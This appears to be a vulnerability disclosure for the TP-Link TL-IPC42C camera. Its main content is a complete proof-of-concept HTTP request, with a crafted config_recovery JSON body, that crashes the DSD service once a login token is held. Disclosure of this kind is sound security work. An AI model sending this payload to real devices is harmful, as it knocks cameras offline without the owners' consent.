
vendor name:TP-Link

model:TL-IPC42C

version: V4.0_20211227_1.0.16

firmware download:https://security.tp-link.com.cn/service/detail_download_9856.html

![be706d3e43a3253c6495d6b797a28f1](https://github.com/user-attachments/assets/c5849e20-ce46-4e01-a734-94dbcb0c35f4)


![image](https://github.com/user-attachments/assets/230069a0-7220-42ff-8474-c424fb249503)


TP-Link TL-IPC42C is a network camera produced by TP-Link.A denial of service vulnerability was discovered in the sub_1DAAC function of the DSD binary, which can cause the DSD service to crash by sending the POC after obtaining the stok credentials for user login.

poc

```
POST /stok=you_stok_here/ds HTTP/1.1

Host: 192.168.2.229

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 326

Origin: http://192.168.2.229

Connection: close

Referer: http://192.168.2.229/



{"system":{"config_recovery":{"config_name":[{"id":"1","pt1_x":"1657","pt1_y":"4382","pt2_x":"9253","pt2_y":"4413","direction":"AtoB","sensitivity":"50","people_enabled":"off"},{"id":"2","pt1_x":"1206","pt1_y":"1574","pt2_x":"9392","pt2_y":"1327","direction":"BtoA","sensitivity":"50","people_enabled":"off"}]}},"method":"do"}
```

![image](https://github.com/user-attachments/assets/8da01337-ac7c-4794-8b62-ebb70c244141)


In the logs of the management interface, it can be seen that the DSD service has experienced several crashes. 

![image](https://github.com/user-attachments/assets/14363876-85a7-463b-91b4-33a3be7576ae)


![image](https://github.com/user-attachments/assets/29f5facc-7a27-4df0-83df-db6b25f43506)


